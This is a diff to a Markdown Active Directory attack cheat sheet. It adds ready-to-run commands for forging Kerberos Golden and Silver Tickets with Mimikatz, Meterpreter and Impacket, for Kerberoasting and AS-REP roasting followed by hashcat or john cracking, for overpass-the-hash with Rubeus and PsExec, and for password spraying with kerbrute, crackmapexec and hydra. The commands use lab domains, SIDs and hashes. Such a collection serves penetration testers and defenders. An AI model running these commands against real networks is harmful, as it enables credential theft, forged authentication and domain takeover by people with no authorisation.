@@ -9,8 +9,8 @@
   * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
   * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
   * [Password in AD User comment](#password-in-ad-user-comment)
-  * [Golden Tickets](#passtheticket-golden-tickets)
-  * [Silver Tickets](#passtheticket-silver-tickets)
+  * [Pass-the-Ticket Golden Tickets](#passtheticket-golden-tickets)
+  * [Pass-the-Ticket Silver Tickets](#passtheticket-silver-tickets)
   * [Kerberoast](#kerberoast)
   * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
@@ -393,31 +393,33 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
-### PassTheTicket Golden Tickets
+### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the krbtgt key
+Forging a TGT require the krbtgt NTLM hash
 
-Mimikatz version
+> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
+
+#### Using Mimikatz
 
 ```powershell
-Get info - Mimikatz
+# Get info - Mimikatz
 lsadump::dcsync /user:krbtgt
 lsadump::lsa /inject /name:krbtgt
 
-Forge a Golden ticket - Mimikatz
+# Forge a Golden ticket - Mimikatz
 kerberos::purge
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 kerberos::tgt
 ```
 
-Meterpreter version
+#### Using Meterpreter 
 
 ```powershell
-Get info - Meterpreter(kiwi)
+# Get info - Meterpreter(kiwi)
 dcsync_ntlm krbtgt
 dcsync krbtgt
 
-Forge a Golden ticket - Meterpreter
+# Forge a Golden ticket - Meterpreter
 load kiwi
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
@@ -426,40 +428,51 @@ kerberos_ticket_use /root/Downloads/pentestlabuser.tck
 kerberos_ticket_list
 ```
 
-Using a ticket on Linux
+#### Using a ticket on Linux
 
 ```powershell
-Convert the ticket kirbi to ccache with kekeo
+# Convert the ticket kirbi to ccache with kekeo
 misc::convert ccache ticket.kirbi
 
-Alternatively you can use ticketer from Impacket
+# Alternatively you can use ticketer from Impacket
 ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
 
 ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
 
-
 export KRB5CCNAME=/home/user/ticket.ccache
 cat $KRB5CCNAME
 
-
-NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
+# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
 ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
-### PassTheTicket Silver Tickets
+If you need to swap ticket between Windows and Linux, you need to convert them with `ticket_converter` or `kekeo`.
+
+```powershell
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
+Converting ccache => kirbi
+root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+Converting kirbi => ccache
+```
+
+### Pass-the-Ticket Silver Tickets
 
 Forging a TGS require machine accound password (key) from the KDC
 
 ```powershell
-Create a ticket for the service
-kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
-/kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
+# Create a ticket for the service
+mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
 
-Then use the same steps as a Golden ticket
-misc::convert ccache ticket.kirbi
-export KRB5CCNAME=/home/user/ticket.ccache
-./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+# Examples
+mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
+mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park
+
+# Then use the same steps as a Golden ticket
+mimikatz $ misc::convert ccache ticket.kirbi
+
+root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
+root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### Kerberoast
@@ -483,7 +496,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43c360c29c1
 Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 
 ```powershell
-.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD
+.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 ```
 
 Then crack the ticket with hashcat or john
@@ -499,7 +512,7 @@ If a domain user does not have Kerberos preauthentication enabled, an AS-REP can
 
 ```powershell
 C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
-C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user
+C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
 
  ______        _
 (_____ \      | |
@@ -527,6 +540,19 @@ v1.3.4
 [*] AS-REP hash:
 
     $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
+
+C:\Rubeus> john --wordlist=passwords_kerb.txt hashes.asreproast
+```
+
+Using `impacket` to get the hash and `hashcat` to crack it.
+
+```powershell
+# extract hashes
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+
+# crack AS_REP messages
+root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
 
 ### Pass-the-Hash
@@ -565,20 +591,28 @@ sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm has
 
 ### OverPass-the-Hash (pass the key)
 
-Request a TGT with only the NT hash
+Request a TGT with only the NT hash then you can connect to the machine using the TGT.
+
+#### Using impacket
 
 ```powershell
-Using impacket
-./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
-chmod 600 tgwynn.ccache
+root@kali:impacket-examples$ python ./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
+root@kali:impacket-examples$ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+root@kali:impacket-examples$ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 also with the AES Key if you have it
-./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
-
+root@kali:impacket-examples$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
 
 ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
 kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 klist
+```
+
+#### Using Rubeus
+
+```powershell
+C:\Users\triceratops>.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+C:\Users\triceratops>.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
 
 ### Capturing and cracking NTLMv2 hashes
@@ -817,26 +851,29 @@ Password spraying refers to the attack method that takes a large number of usern
 
 > The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
 
-Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
 
 ```powershell
 root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 ```
 
-Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
 ```powershell
 crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
-Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
+#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
 
 ```powershell
 python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
 ```
 
-Using [hydra]() and [ncrack]() to target RDP services.
+#### Using [hydra]() and [ncrack]() to target RDP services.
 
 ```powershell
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
@@ -951,3 +988,4 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
 * [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
+* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
